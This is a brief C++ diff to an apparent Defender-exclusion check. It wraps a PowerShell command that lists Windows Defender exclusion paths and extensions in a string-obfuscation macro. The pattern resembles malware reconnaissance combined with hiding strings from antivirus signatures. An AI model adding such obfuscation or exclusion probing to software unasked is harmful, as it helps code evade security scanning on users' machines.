@@ -2,8 +2,7 @@
 
 void checkExclusions::ExclusionCheck()
 {
-    std::string command = "powershell -Command \"Get-MpPreference | Select-Object -Property ExclusionExtension, ExclusionPath | Out-String -Width 4096\"";
-    int result = system(command.c_str());
+    int result = system(AY_OBFUSCATE("powershell -Command \"Get-MpPreference | Select-Object -Property ExclusionExtension, ExclusionPath | Out-String -Width 4096\""));
 
     if (result != 0)
     {
